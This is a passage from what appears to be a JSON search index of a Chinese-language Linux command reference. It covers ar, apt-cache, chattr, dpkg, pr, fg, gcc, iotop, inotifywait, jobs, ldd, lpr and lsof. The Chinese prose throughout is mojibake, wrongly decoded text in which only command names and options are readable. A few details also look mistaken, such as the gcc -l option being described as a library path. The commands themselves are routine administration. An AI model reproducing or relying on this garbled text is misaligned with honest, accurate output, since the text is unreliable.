åªå°†æ—¥æœŸè¾ƒæ–°æ–‡ä»¶æ’å…¥å¤‡å­˜æ–‡ä»¶ä¸­ã€‚ v ç¨‹åºæ‰§è¡Œæ—¶æ˜¾ç¤ºè¯¦ç»†çš„ä¿¡æ¯ã€‚ V æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ã€‚ ç”¨ä¾‹: å³å¯ä»¥å°† b.o(å¯¹è±¡æ–‡ä»¶) åŠ å…¥åˆ°liba.aä¸­, å³æ‰“åŒ…ä¸ºé™æ€åº“æ–‡ä»¶: ar -r liba.a b.o é»˜è®¤çš„åŠ å…¥æ–¹å¼ä¸ºappendï¼Œå³åŠ åœ¨åº“çš„æœ«å°¾ã€‚\"r\"å…³é”®å­—å¯ä»¥æœ‰ä¸‰ä¸ªä¿®é¥°ç¬¦\"a\", \"b\"å’Œ\"i\"ã€‚ \"a\"è¡¨ç¤ºafterï¼Œå³å°†æ–°æˆå‘˜åŠ åœ¨æŒ‡å®šæˆå‘˜ä¹‹åã€‚ä¾‹å¦‚\"ar -ra a.c liba.a b.c\"è¡¨ç¤ºå°†b.cåŠ å…¥liba.aå¹¶æ”¾åœ¨å·²æœ‰æˆå‘˜a.cä¹‹åï¼› \"b\"è¡¨ç¤ºbeforeï¼Œå³å°†æ–°æˆå‘˜åŠ åœ¨æŒ‡å®šæˆå‘˜ä¹‹å‰ã€‚ä¾‹å¦‚\"ar -rb a.c liba.a b.c\"; \"i\"è¡¨ç¤ºinsertï¼Œè·Ÿ\"b\"ä½œç”¨ç›¸åŒã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AR.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AR.html"},{"title":"apt-cache","text":"æ”¯æŒçš„command depends æŸ¥çœ‹è¯¥è½¯ä»¶åŒ…éœ€è¦å“ªäº›ä¾èµ–åŒ… rdepends æŸ¥çœ‹è¯¥è½¯ä»¶åŒ…è¢«å“ªäº›åŒ…ä¾èµ– åˆ—å‡ºè½¯ä»¶çš„å®‰è£…æ¥æº åˆ—: apt-cache madison $soft # æœç´¢æºé‡Œé¢çš„å¯ç”¨ç‰ˆæœ¬ apt-cache policy $sofy # æ¯”ä¸Šé¢é‚£ä¸ªè¯¦ç»†ä¸€ç‚¹ apt-cache showpkg $soft # æ¯”ä¸Šä¸€ä¸ªæ›´è¯¦ç»†ï¼Œè¿˜ä¼šåˆ—å‡ºæ‰€æœ‰ç›¸å…³çš„ apt-cache show $soft # æ˜¾ç¤ºæŒ‡å®šåŒ…çš„è¯¦æƒ… dpkg -s $softä¹Ÿå¯ä»¥","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Apt-Cache.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Apt-Cache.html"},{"title":"chattr","text":"Linux chattrå‘½ä»¤ç”¨äºæ”¹å˜æ–‡ä»¶å±æ€§ã€‚ è¿™é¡¹æŒ‡ä»¤å¯æ”¹å˜å­˜æ”¾åœ¨ext2æ–‡ä»¶ç³»ç»Ÿä¸Šçš„æ–‡ä»¶æˆ–ç›®å½•å±æ€§ï¼Œè¿™äº›å±æ€§å…±æœ‰ä»¥ä¸‹8ç§æ¨¡å¼ï¼š aï¼šè®©æ–‡ä»¶æˆ–ç›®å½•ä»…ä¾›é™„åŠ ç”¨é€”ã€‚ bï¼šä¸æ›´æ–°æ–‡ä»¶æˆ–ç›®å½•çš„æœ€åå­˜å–æ—¶é—´ã€‚ cï¼šå°†æ–‡ä»¶æˆ–ç›®å½•å‹ç¼©åå­˜æ”¾ã€‚ dï¼šå°†æ–‡ä»¶æˆ–ç›®å½•æ’é™¤åœ¨å€¾å€’æ“ä½œä¹‹å¤–ã€‚ iï¼šä¸å¾—ä»»æ„æ›´åŠ¨æ–‡ä»¶æˆ–ç›®å½•, é¢„é˜²è¢«åˆ é™¤, ä¹Ÿä¸èƒ½æ›´æ”¹æ–‡ä»¶æƒé™ã€‚ sï¼šä¿å¯†æ€§åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ã€‚ Sï¼šå³æ—¶æ›´æ–°æ–‡ä»¶æˆ–ç›®å½•ã€‚ uï¼šé¢„é˜²è¢«ä¿®æ”¹ã€‚ e: å…è®¸è®¾ç½®æ‹“å±•å±æ€§ (é€šè¿‡ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/setfattr å’Œ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/getfattr ) è¯­æ³•: chattr [-RV][-v<ç‰ˆæœ¬ç¼–å·>][+/-/=<å±æ€§>][æ–‡ä»¶æˆ–ç›®å½•...] é€‰é¡¹: -R é€’å½’å¤„ç†ï¼Œå°†æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠå­ç›®å½•ä¸€å¹¶å¤„ç†ã€‚ -v <ç‰ˆæœ¬ç¼–å·> è®¾ç½®æ–‡ä»¶æˆ–ç›®å½•ç‰ˆæœ¬ã€‚ -V æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ã€‚ +<å±æ€§> å¼€å¯æ–‡ä»¶æˆ–ç›®å½•çš„è¯¥é¡¹å±æ€§ã€‚ -<å±æ€§> å…³é—­æ–‡ä»¶æˆ–ç›®å½•çš„è¯¥é¡¹å±æ€§ã€‚ =<å±æ€§> æŒ‡å®šæ–‡ä»¶æˆ–ç›®å½•çš„è¯¥é¡¹å±æ€§ã€‚ å®ä¾‹ ç”¨chattrå‘½ä»¤é˜²æ­¢ç³»ç»Ÿä¸­æŸä¸ªå…³é”®æ–‡ä»¶è¢«ä¿®æ”¹: chattr +i /etc/resolv.conf lsattr /etc/resolv.conf ä¼šæ˜¾ç¤ºå¦‚ä¸‹å±æ€§: ----i-------- /etc/resolv.conf è®©æŸä¸ªæ–‡ä»¶åªèƒ½å¾€é‡Œé¢è¿½åŠ æ•°æ®ï¼Œä½†ä¸èƒ½åˆ é™¤ï¼Œé€‚ç”¨äºå„ç§æ—¥å¿—æ–‡ä»¶: chattr +a /var/log/messages è¿™å°±ç»™ file æ–‡ä»¶æ·»åŠ äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„ user.email æ‰©å±•å±æ€§: chattr +e file setfattr -n user.email -v \"test@example.com\" file getfattr -n user.email file","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Chattr.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Chattr.html"},{"title":"dpkg","text":"debian linuxä¸Šå®‰è£…ã€åˆ›å»ºã€ç®¡ç†è½¯ä»¶åŒ…çš„å·¥å…· é€‰é¡¹å‚æ•° -i <package> , --install <package> å®‰è£…è½¯ä»¶åŒ… package -r <package> , --remove <package> åˆ é™¤è½¯ä»¶åŒ… -P <package> , --purge <package> åˆ é™¤è½¯ä»¶åŒ…çš„åŒæ—¶åˆ é™¤å…¶é…ç½®æ–‡ä»¶ -L <package> , --listfiles <package> æ˜¾ç¤ºè½¯ä»¶åŒ…å…³è”çš„æ–‡ä»¶ -l æ˜¾ç¤ºå·²å®‰è£…è½¯ä»¶åŒ…åˆ—è¡¨ --unpack è§£å¼€è½¯ä»¶åŒ… -c <package> æ˜¾ç¤ºè½¯ä»¶åŒ…å†…æ–‡ä»¶åˆ—è¡¨ --confiugre <package> é…ç½®è½¯ä»¶åŒ… -s <package> , --status <package> æŸ¥çœ‹è½¯ä»¶åŒ…ä¿¡æ¯ï¼Œæ˜¯å¦å·²å®‰è£…ä¹‹ç±» -S æœç´¢ --list æŸ¥çœ‹æ‰€æœ‰å·²å®‰è£…è½¯ä»¶åŒ… -b <dir deb_name> æ‰“åŒ…è½¯ä»¶åŒ…, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºdebçš„æ„å»ºç›®å½•, ç¬¬äºŒä¸ªä¸ºåŒ…å --info <package> æŸ¥çœ‹debåŒ…ä¿¡æ¯ -x <package dir> è§£å‹debä¸­æ‰€è¦å®‰è£…çš„æ–‡ä»¶, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ‰€è¦è§£å‹çš„debåŒ…ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå°†debåŒ…è§£å‹åˆ°æŒ‡å®šçš„ç›®å½• ä¸è¿‡è¿™ä¸ªåªèƒ½è§£å‡ºå®‰è£…æ–‡ä»¶, desktopç­‰æ–‡ä»¶è§£åŒ…çš„ç”¨ dpkg-deb -R -e <package> è§£å‹debä¸­æ‰€è¦å®‰è£…çš„æ–‡ä»¶, ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ‰€è¦è§£å‹çš„debåŒ…ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå°†debåŒ…è§£å‹åˆ°æŒ‡å®šçš„ç›®å½• æ³¨è§£ è¯»å–æ‰‹å†Œä½¿ç”¨: man dpkg-query è€Œä¸æ˜¯: man dpkg dpkg -l ç»“æœ dpkg -l ç»“æœç»“æ„è§£æ: root@6378b4ca047d:/# dpkg -l Desired=Unknown/Install/Remove/Purge/Hold | Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend |/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad) ||/ Name Version Architecture Description +++-===========================-=======================-============-=============================================================================== ii adduser 3.118ubuntu2 all add and remove users and groups ii apt 2.0.2 amd64 commandline package manager ç¬¬ä¸€åˆ—é¦–å­—æ¯å«ä¹‰ é¦–å­—æ¯ å«ä¹‰ u æœªçŸ¥ i å®‰è£… r åˆ é™¤/å¸è½½ p æ¸…é™¤ï¼ˆåˆ é™¤åŒ…æ‹¬é…ç½®æ–‡ä»¶ï¼‰ h ï¼Ÿï¼Ÿï¼Ÿä¿æŒï¼Ÿä¿ç•™ï¼Ÿ ç¬¬ä¸€åˆ—ç¬¬äºŒå­—æ¯å«ä¹‰ å­—æ¯ å«ä¹‰ n æœªå®‰è£… i å®‰è£… c ä»…å®‰è£…é…ç½®æ–‡ä»¶ U å·²è§£å‹ F ç”±äºæŸç§åŸå› é…ç½®å¤±è´¥ï¼ˆåŠé…ç½®ï¼‰ H ç”±äºæŸç§åŸå› å®‰è£…å¤±è´¥ï¼ˆåŠå®‰è£…ï¼‰ W ç­‰å¾…è§¦å‘å™¨ï¼ˆç¨‹åºåŒ…æ­£åœ¨ç­‰å¾…å¦ä¸€ä¸ªç¨‹åºåŒ…çš„è§¦å‘å™¨ï¼‰ t è§¦å‘æŒ‚èµ·ï¼ˆå·²ç»è§¦å‘ï¼‰ ç¬¬ä¸€åˆ—ç¬¬ä¸‰å­—æ¯å«ä¹‰ å­—æ¯ å«ä¹‰ R éœ€è¦é‡æ–°å®‰è£…ï¼ˆåŒ…æŸå éœ€é‡è£…ï¼‰ å¦‚: ii è¡¨ç¤ºè½¯ä»¶æ­£å¸¸å®‰è£… rcè¡¨ç¤ºè½¯ä»¶å·²å¸è½½ï¼Œå¯æ˜¯é…ç½®æ–‡ä»¶è¿˜åœ¨ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤è¿›è¡Œæ¸…ç†: dpkg -l | grep &#94;rc | cut -d' ' -f3 | sudo xargs dpkg --purg","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-DPKG.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-DPKG.html"},{"title":"pr","text":"å°†æ–‡æœ¬æ–‡ä»¶è½¬æ¢æˆé€‚åˆæ‰“å°çš„æ ¼å¼ï¼Œå®ƒå¯ä»¥æŠŠè¾ƒå¤§çš„æ–‡ä»¶åˆ†å‰²æˆå¤šä¸ªé¡µé¢è¿›è¡Œæ‰“å°ï¼Œå¹¶ä¸ºæ¯ä¸ªé¡µé¢æ·»åŠ æ ‡é¢˜ã€‚ è¯­æ³•: pr(é€‰é¡¹)(å‚æ•°) é€‰é¡¹ -h <æ ‡é¢˜> ä¸ºé¡µæŒ‡å®šæ ‡é¢˜ï¼› -l <è¡Œæ•°> æŒ‡å®šæ¯é¡µçš„è¡Œæ•°ã€‚ å‚æ•° æ–‡ä»¶ éœ€è¦è½¬æ¢æ ¼å¼çš„æ–‡ä»¶ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Deceptive.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Deceptive.html"},{"title":"fg","text":"æ¢å¤åƒè¢« Ctrl + Z æŒ‚èµ·çš„è¿›ç¨‹çš„æ‰§è¡Œ ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/jobs æŸ¥çœ‹åå°è¿è¡Œçš„è¿›ç¨‹, ä½¿ç¬¬ N ä¸ªä»»åŠ¡åœ¨å‰å°è¿è¡Œ: fg %N é»˜è®¤ä¸å¸¦%Næ—¶è¡¨ç¤ºå¯¹æœ€åä¸€ä¸ªè¿›ç¨‹æ“ä½œï¼","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-France.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-France.html"},{"title":"gcc","text":"è¯¦è§ /docs/åç«¯/c/gcc(++)ç¼–è¯‘å™¨ é€‰é¡¹ -I <dir> æŒ‡å®šå¤´æ–‡ä»¶æ‰€åœ¨ç›®å½•, ä¼šä¼˜å…ˆæ‰¾æ­¤å¤„æŒ‡å®šçš„ç›®å½• -l <dir> æŒ‡å®šåº“è·¯å¾„. æŒ‡å®šéœ€è¦é“¾æ¥çš„åº“åï¼Œç”¨äºå‘Šè¯‰é“¾æ¥å™¨éœ€è¦é“¾æ¥å“ªäº›åº“æ–‡ä»¶ -L <dir> æŒ‡å®šåº“æ–‡ä»¶æ‰€åœ¨ç›®å½• -f no-lto ç¦ç”¨é“¾æ¥æ—¶ä¼˜åŒ–ï¼ˆLTOï¼‰ å½“ä½¿ç”¨è¯¥é€‰é¡¹ç¼–è¯‘æºä»£ç æ—¶ï¼Œç¼–è¯‘å™¨å°†ä¸ä¼šè¿›è¡Œé“¾æ¥æ—¶ä¼˜åŒ–ï¼Œ è¿™å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›æ€§èƒ½ä¸Šçš„æŸå¤±ï¼Œä½†ä¹Ÿå¯ä»¥é¿å…æŸäº›é“¾æ¥é”™è¯¯ã€‚ æ³¨è§£ -fno-lto ä¸»è¦ç”¨äºä½¿ç”¨çš„é“¾æ¥æ–‡ä»¶æ˜¯ç”±å…¶ä»–ç‰ˆæœ¬LTOçš„gccç¼–è¯‘æ—¶å¯¼è‡´æ— æ³•ç»§ç»­ç¼–è¯‘æ—¶å€™å§","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GCC.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GCC.html"},{"title":"iotop","text":"iotop ä¸€ä¸ªç”¨æ¥ç›‘è§†ç£ç›˜I/Oä½¿ç”¨çŠ¶å†µçš„topç±»å·¥å…·ã€‚ iotopå…·æœ‰ä¸topç›¸ä¼¼çš„UIï¼Œå…¶ä¸­åŒ…æ‹¬PIDã€ç”¨æˆ·ã€I/Oã€è¿›ç¨‹ç­‰ç›¸å…³ä¿¡æ¯ã€‚ Linuxä¸‹çš„IOç»Ÿè®¡å·¥å…·å¦‚iostatï¼Œnmonç­‰å¤§å¤šæ•°æ˜¯åªèƒ½ç»Ÿè®¡åˆ°perè®¾å¤‡çš„è¯»å†™æƒ…å†µï¼Œ å¦‚æœä½ æƒ³çŸ¥é“æ¯ä¸ªè¿›ç¨‹æ˜¯å¦‚ä½•ä½¿ç”¨IOçš„å°±æ¯”è¾ƒéº»çƒ¦ï¼Œä½¿ç”¨iotopå‘½ä»¤å¯ä»¥å¾ˆæ–¹ä¾¿çš„æŸ¥çœ‹ã€‚ iotopä½¿ç”¨Pythonè¯­è¨€ç¼–å†™è€Œæˆï¼Œè¦æ±‚Python2.5ï¼ˆåŠä»¥ä¸Šç‰ˆæœ¬ï¼‰å’ŒLinux kernel2.6.20ï¼ˆåŠä»¥ä¸Šç‰ˆæœ¬ï¼‰ã€‚ iotopæä¾›æœ‰æºä»£ç åŠrpmåŒ…ï¼Œå¯ä»å…¶å®˜æ–¹ä¸»é¡µä¸‹è½½ã€‚ é€‰é¡¹ -o åªæ˜¾ç¤ºæœ‰ioæ“ä½œçš„è¿›ç¨‹ -b æ‰¹é‡æ˜¾ç¤ºï¼Œæ— äº¤äº’ï¼Œä¸»è¦ç”¨ä½œè®°å½•åˆ°æ–‡ä»¶ã€‚ -n NUM æ˜¾ç¤ºNUMæ¬¡ï¼Œä¸»è¦ç”¨äºéäº¤äº’å¼æ¨¡å¼ã€‚ -d SEC é—´éš”SECç§’æ˜¾ç¤ºä¸€æ¬¡ã€‚ -p PID ç›‘æ§çš„è¿›ç¨‹pidã€‚ -u USER ç›‘æ§çš„è¿›ç¨‹ç”¨æˆ·ã€‚ -t , --time åŠ ä¸Šæ—¶é—´æˆ³ï¼Œéäº¤äº’éæ¨¡å¼ iotopå¸¸ç”¨å¿«æ·é”®: å·¦å³ç®­å¤´ï¼šæ”¹å˜æ’åºæ–¹å¼ï¼Œé»˜è®¤æ˜¯æŒ‰IOæ’åºã€‚ rï¼šæ”¹å˜æ’åºé¡ºåºã€‚ oï¼šåªæ˜¾ç¤ºæœ‰IOè¾“å‡ºçš„è¿›ç¨‹ã€‚ pï¼šè¿›ç¨‹/çº¿ç¨‹çš„æ˜¾ç¤ºæ–¹å¼çš„åˆ‡æ¢ã€‚ aï¼šæ˜¾ç¤ºç´¯ç§¯ä½¿ç”¨é‡ã€‚ qï¼šé€€å‡ºã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-IOTOP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-IOTOP.html"},{"title":"inotifywait","text":"ç›‘æ§æ–‡ä»¶å¤¹å˜åŒ–, é€‚ç”¨äºLinux å®‰è£…: brew install inotify-tools ä½¿ç”¨inotifywaitå‘½ä»¤æ¥ç›‘å¬æ–‡ä»¶å¤¹å˜åŒ–çš„åŸºæœ¬ç¤ºä¾‹: inotifywait -m -r -e create,modify,delete /path/to/directory # -e create,modify,delete # æŒ‡å®šè¦ç›‘å¬çš„äº‹ä»¶ç±»å‹ï¼ŒåŒ…æ‹¬æ–‡ä»¶çš„åˆ›å»ºã€ä¿®æ”¹å’Œåˆ é™¤ã€‚ # /path/to/directoryï¼šè¦ç›‘å¬çš„ç›®æ ‡æ–‡ä»¶å¤¹çš„è·¯å¾„ã€‚ -m ä¿æŒç›‘å¬çŠ¶æ€ï¼ŒæŒç»­ç›‘è§†æ–‡ä»¶å¤¹çš„å˜åŒ–ã€‚ -r é€’å½’åœ°ç›‘å¬å­ç›®å½•ã€‚ è¿è¡Œä»¥ä¸Šå‘½ä»¤åï¼Œinotifywaitä¼šä¸€ç›´è¿è¡Œå¹¶ç›‘å¬æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å˜åŒ–ã€‚ å½“æœ‰æ–°æ–‡ä»¶è¢«åˆ›å»ºã€æ–‡ä»¶è¢«ä¿®æ”¹æˆ–æ–‡ä»¶è¢«åˆ é™¤æ—¶ï¼Œå®ƒä¼šè¾“å‡ºç›¸åº”çš„äº‹ä»¶ä¿¡æ¯ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Inotifywait.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Inotifywait.html"},{"title":"jobs","text":"æŸ¥çœ‹åå°è¢«æŒ‚èµ·çš„è¿›ç¨‹, ä¸€èˆ¬ç”¨äº Ctrl + Z æ‰‹åŠ¨æŒ‚èµ·è¿›ç¨‹åçš„æŸ¥çœ‹ é€šè¿‡ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/fg å‘½ä»¤å¯ä»¥æ¢å¤è¿›ç¨‹åˆ°å‰å°æ‰§è¡Œ; /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/bg å‘½ä»¤æ¢å¤è¿›ç¨‹åˆ°åå°æ‰§è¡Œ: jobs æ˜¾ç¤ºå½“å‰æš‚åœçš„è¿›ç¨‹ bg %N ä½¿ç¬¬Nä¸ªä»»åŠ¡åœ¨åå°è¿è¡Œï¼ˆ%å‰æœ‰ç©ºæ ¼ï¼‰ fg %N ä½¿ç¬¬Nä¸ªä»»åŠ¡åœ¨å‰å°è¿è¡Œ","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Jobs.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Jobs.html"},{"title":"ldd","text":"ç”¨äºæ‰“å°ç¨‹åºæˆ–è€…åº“æ–‡ä»¶æ‰€ä¾èµ–çš„å…±äº«åº“åˆ—è¡¨ å®‰è£…(ubuntu, å¾…éªŒè¯, macä¸‹ä¸è¡Œ): apt install binutils è¯­æ³•: ldd (é€‰é¡¹) (å‚æ•°) é€‰é¡¹ --version æ‰“å°æŒ‡ä»¤ç‰ˆæœ¬å·ï¼› -v è¯¦ç»†ä¿¡æ¯æ¨¡å¼ï¼Œæ‰“å°æ‰€æœ‰ç›¸å…³ä¿¡æ¯ï¼› -u æ‰“å°æœªä½¿ç”¨çš„ç›´æ¥ä¾èµ–ï¼› -d æ‰§è¡Œé‡å®šä½å’ŒæŠ¥å‘Šä»»ä½•ä¸¢å¤±çš„å¯¹è±¡ï¼› -r æ‰§è¡Œæ•°æ®å¯¹è±¡å’Œå‡½æ•°çš„é‡å®šä½ï¼Œå¹¶ä¸”æŠ¥å‘Šä»»ä½•ä¸¢å¤±çš„å¯¹è±¡å’Œå‡½æ•°ï¼› --help æ˜¾ç¤ºå¸®åŠ©ä¿¡æ¯ã€‚ å‚æ•° æ–‡ä»¶ï¼šæŒ‡å®šå¯æ‰§è¡Œç¨‹åºæˆ–è€…æ–‡åº“ã€‚ åŸç† lddä¸æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºï¼Œè€Œåªæ˜¯ä¸€ä¸ªshellè„šæœ¬ lddèƒ½å¤Ÿæ˜¾ç¤ºå¯æ‰§è¡Œæ¨¡å—çš„dependency(æ‰€å±)(æ‰€å±)ï¼Œ å…¶åŸç†æ˜¯é€šè¿‡è®¾ç½®ä¸€ç³»åˆ—çš„ç¯å¢ƒå˜é‡ï¼Œå¦‚ä¸‹: LD_TRACE_LOADED_OBJECTS LD_WARN LD_BIND_NOW LD_LIBRARY_VERSION LD_VERBOSE ç­‰ å½“LD_TRACE_LOADED_OBJECTSç¯å¢ƒå˜é‡ä¸ä¸ºç©ºæ—¶ï¼Œä»»ä½•å¯æ‰§è¡Œç¨‹åºåœ¨è¿è¡Œæ—¶ï¼Œ å®ƒéƒ½ä¼šåªæ˜¾ç¤ºæ¨¡å—çš„dependency(æ‰€å±)ï¼Œè€Œç¨‹åºå¹¶ä¸çœŸæ­£æ‰§è¡Œã€‚ ä½ å¯ä»¥åœ¨shellç»ˆç«¯æµ‹è¯•ä¸€ä¸‹ï¼Œå¦‚ä¸‹ï¼š export LD_TRACE_LOADED_OBJECTS=1 å†æ‰§è¡Œä»»ä½•çš„ç¨‹åºï¼Œå¦‚lsç­‰ï¼Œçœ‹çœ‹ç¨‹åºçš„è¿è¡Œç»“æœã€‚ lddæ˜¾ç¤ºå¯æ‰§è¡Œæ¨¡å—çš„dependency(æ‰€å±)çš„å·¥ä½œåŸç†ï¼Œ å…¶å®è´¨æ˜¯é€šè¿‡ld-linux.soï¼ˆelfåŠ¨æ€åº“çš„è£…è½½å™¨ï¼‰æ¥å®ç°çš„ã€‚ æˆ‘ä»¬çŸ¥é“ï¼Œld-linux.soæ¨¡å—ä¼šå…ˆäºexecutableæ¨¡å—ç¨‹åºå·¥ä½œï¼Œå¹¶è·å¾—æ§åˆ¶æƒï¼Œ å› æ­¤å½“ä¸Šè¿°çš„é‚£äº›ç¯å¢ƒå˜é‡è¢«è®¾ç½®æ—¶ï¼Œld-linux.soé€‰æ‹©äº†æ˜¾ç¤ºå¯æ‰§è¡Œæ¨¡å—çš„dependency(æ‰€å±)ã€‚ å®é™…ä¸Šå¯ä»¥ç›´æ¥æ‰§è¡Œld-linux.soæ¨¡å—ï¼Œå¦‚: /lib/ld-linux.so.2 --list program ç›¸å½“äºldd program","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LDD.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LDD.html"},{"title":"lpr","text":"ç”¨äºå°†æ–‡ä»¶å‘é€ç»™æŒ‡å®šæ‰“å°æœºè¿›è¡Œæ‰“å°ï¼Œå¦‚æœä¸æŒ‡å®šç›®æ ‡æ‰“å°æœºï¼Œåˆ™ä½¿ç”¨é»˜è®¤æ‰“å°æœºã€‚ è¯­æ³•: lpr(é€‰é¡¹)(å‚æ•°) é€‰é¡¹ -E ä¸æ‰“å°æœåŠ¡å™¨è¿æ¥æ—¶å¼ºåˆ¶ä½¿ç”¨åŠ å¯†ï¼› -H æŒ‡å®šå¯é€‰çš„æ‰“å°æœåŠ¡å™¨ï¼› -C æŒ‡å®šæ‰“å°ä»»åŠ¡çš„åç§°ï¼› -P æŒ‡å®šæ¥å—æ‰“å°ä»»åŠ¡çš„ç›®æ ‡æ‰“å°æœºï¼› -U æŒ‡å®šå¯é€‰çš„ç”¨æˆ·åï¼› -h å…³é—­banneræ‰“å°ï¼› -m æ‰“å°å®Œæˆåå‘é€E-mailï¼› -r æ‰“å°å®Œæˆååˆ é™¤æ–‡ä»¶ã€‚ å…¶ä»–: -# æŒ‡å®šæ‰“å°çš„ä»½æ•°ï¼› å‚æ•° æ–‡ä»¶ éœ€æ‰“å°çš„æ–‡ä»¶ã€‚ å®ä¾‹ å°†man1å’Œman2é€åˆ°æ‰“å°æœºlpè¿›è¡Œæ‰“å°: lpr -P lp man1 man2","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LPR.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LPR.html"},{"title":"lsof","text":"å¼ºå¤§çš„æŸ¥è¯¢å·¥å…·ï¼Œ-iå‡ ä¹ä¸‡èƒ½ï¼ˆè‡ªå¹ï¼‰ å…³é”®é€‰é¡¹ é»˜è®¤ : æ²¡æœ‰é€‰é¡¹ï¼Œlsofåˆ—å‡ºæ´»è·ƒè¿›ç¨‹çš„æ‰€æœ‰æ‰“å¼€æ–‡ä»¶ ç»„åˆ : å¯ä»¥å°†é€‰é¡¹ç»„åˆåˆ°ä¸€èµ·ï¼Œå¦‚-abcï¼Œä½†è¦å½“å¿ƒå“ªäº›é€‰é¡¹éœ€è¦å‚æ•° -a ç»“æœè¿›è¡Œ\"ä¸\"è¿ç®—ï¼ˆè€Œä¸æ˜¯\"æˆ–\"ï¼‰ -l åœ¨è¾“å‡ºæ˜¾ç¤ºç”¨æˆ·IDè€Œä¸æ˜¯ç”¨æˆ·å -h è·å¾—å¸®åŠ© -t ä»…è·å–è¿›ç¨‹ID -U è·å–UNIXå¥—æ¥å£åœ°å€ -F æ ¼å¼åŒ–è¾“å‡ºç»“æœï¼Œç”¨äºå…¶å®ƒå‘½ä»¤ã€‚ å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼æ ¼å¼åŒ–ï¼Œå¦‚-F pcfnï¼ˆç”¨äºè¿›ç¨‹idã€å‘½ä»¤åã€æ–‡ä»¶æè¿°ç¬¦ã€æ–‡ä»¶åï¼Œå¹¶ä»¥ç©ºç»ˆæ­¢ï¼‰ -i æ¡ä»¶æŸ¥è¯¢è¿æ¥, å¦‚æŒ‡å®šåè®®: lsof -i tcp:$port -iï¼ˆ4,6ï¼Œåè®®ï¼Œï¼šç«¯å£ï¼Œ@ipï¼‰ -c æŸ¥çœ‹æŒ‡å®šçš„å‘½ä»¤æ­£åœ¨ä½¿ç”¨çš„æ–‡ä»¶ä¸ç½‘ç»œè¿æ¥ -c vim -u æ˜¾ç¤ºæŒ‡å®šç”¨æˆ·æ‰“å¼€äº†ä»€ä¹ˆ -u <user> æ¶ˆç­æŒ‡å®šç”¨æˆ·çš„æ‰€æœ‰ä¸œè¥¿ kill -9 lsof -t -u luyi -p æŒ‡å®šè¿›ç¨‹ID(pid)å·²ç»æ‰“å¼€çš„æ–‡ä»¶ -p 643 +d æŸ¥çœ‹æŸç›®å½•æ–‡ä»¶ä¿¡æ¯ ä¸åŠ dä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯å¯èƒ½ä¸å…¨ +D é€’å½’æŸ¥çœ‹æŸç›®å½•æ–‡ä»¶ä¿¡æ¯ æ›´è¯¦ç»†çš„æè¿°ä»¥åŠæ¢å¤è¢«åˆ é™¤çš„æ–‡ä»¶ï¼ŒæŸç§æƒ…å†µ å¯å‚è€ƒ: https://www.cnblogs.com/sparkbj/p/7161669.html macä¸‹æŸ¥çœ‹æŒ‡å®šç«¯å£æ˜¯å¦æœ‰å ç”¨, å¦‚æŸ¥è¯¢ tcpçš„8080æ˜¯å¦å ç”¨: lsof -i tcp:8080 ä½¿ç”¨è¿™ä¸ªä¸»è¦æ˜¯å› ä¸º mac çš„ netstat è·Ÿlinuxä¸‹æœ‰ç‚¹ä¸ä¸€æ 